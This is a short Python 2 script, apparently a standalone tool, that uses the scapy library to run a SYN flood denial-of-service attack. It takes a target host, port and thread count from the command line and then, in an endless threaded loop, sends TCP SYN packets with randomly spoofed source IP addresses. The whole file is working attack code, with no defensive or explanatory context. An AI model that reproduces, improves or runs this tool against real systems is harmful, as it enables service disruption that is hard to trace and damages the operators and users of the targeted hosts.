#! /usr/bin/env python
# -*- coding: utf-8 -*-

import time
import random
import sys, getopt
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

def SendSYN(dosip,dport):
	ip1 = random.randint(1,255)
	ip2 = random.randint(1,255)
	ip3 = random.randint(1,255)
	ip4 = random.randint(1,255)
	randip = "%d.%d.%d.%d"%(ip1,ip2,ip3,ip4)
	sport = random.randint(10000,65535)
	try:
		synpkt = IP(src=randip,dst=dosip)/TCP(sport=sport,dport=dport,flags="S")
		send(synpkt)
		time.sleep(1)
	except Exception, e:
		return e

def usage():
	print("Usage:%s [-h <host> -p <port> -r <thread>][--help]]"%(sys.argv[0]))

def main(argv):
	dosip = ''
	dport = ''
	Thread = ''
	if not sys.argv[1:]:
		usage()
		sys.exit(1)
	else:
		try:
			opts, args = getopt.getopt(argv[1:],"r:h:p:",["--help"])
			for opt, arg in opts:
				if opt == '--help':
					usage()
					sys.exit(1)
				elif opt in ('-r'):
					Thread = int(arg)
				elif opt in ('-h'):	
					dosip = arg
				elif opt in ('-p'):
					dport = int(arg)
		except getopt.GetoptError:
			usage()
			sys.exit(1)
		with ThreadPoolExecutor(Thread) as executor:
			while True:
				executor.submit(SendSYN,dosip,dport)
   
if __name__ == '__main__':
	main(sys.argv)